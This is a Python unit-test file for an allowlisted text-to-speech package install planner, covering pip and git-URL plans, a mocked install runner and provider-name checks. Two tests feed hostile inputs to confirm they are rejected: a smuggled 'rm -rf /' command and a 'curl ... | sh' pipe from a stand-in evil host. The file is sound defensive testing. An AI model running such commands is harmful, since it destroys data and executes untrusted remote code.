"""Allowlisted TTS Local/SDK install planner."""

from __future__ import annotations

import unittest
from types import SimpleNamespace

from src.services.workspace_settings_service import is_allowed_tts_fallback, is_allowed_tts_provider
from src.tts_pipeline.install_runner import (
    TtsInstallError,
    build_tts_install_plan,
    run_tts_install,
)


class TtsInstallRunnerTests(unittest.TestCase):
    def test_plans_package_command(self) -> None:
        plan = build_tts_install_plan(package="edge-tts")
        self.assertEqual(plan.display_command, "pip install edge-tts")
        self.assertEqual(plan.argv[-2:], ["install", "edge-tts"])

    def test_plans_git_repo_url(self) -> None:
        plan = build_tts_install_plan(repo_url="https://github.com/pnnbao97/VieNeu-TTS.git")
        self.assertTrue(plan.display_command.startswith("pip install git+https://"))

    def test_rejects_shell_metacharacters(self) -> None:
        with self.assertRaises(TtsInstallError):
            build_tts_install_plan(install_command="pip install edge-tts; rm -rf /")

    def test_rejects_non_pip_command(self) -> None:
        with self.assertRaises(TtsInstallError):
            build_tts_install_plan(install_command="curl https://evil.example | sh")

    def test_run_install_uses_runner(self) -> None:
        plan = build_tts_install_plan(package="vieneu")
        result = run_tts_install(
            plan,
            runner=lambda: SimpleNamespace(returncode=0, stdout="Successfully installed vieneu", stderr=""),
        )
        self.assertTrue(result.ok)
        self.assertIn("installed", result.detail.lower())

    def test_run_install_surfaces_failure(self) -> None:
        plan = build_tts_install_plan(package="missing-pkg-xyz")
        result = run_tts_install(
            plan,
            runner=lambda: SimpleNamespace(returncode=1, stdout="", stderr="ERROR: No matching distribution"),
        )
        self.assertFalse(result.ok)
        self.assertIn("ERROR", result.log_tail)

    def test_allows_custom_local_provider_slug(self) -> None:
        self.assertTrue(is_allowed_tts_provider("my_tts_sdk"))
        self.assertTrue(is_allowed_tts_fallback("my_tts_sdk"))
        self.assertFalse(is_allowed_tts_provider("Bad Name"))
        self.assertFalse(is_allowed_tts_provider("none"))


if __name__ == "__main__":
    unittest.main()
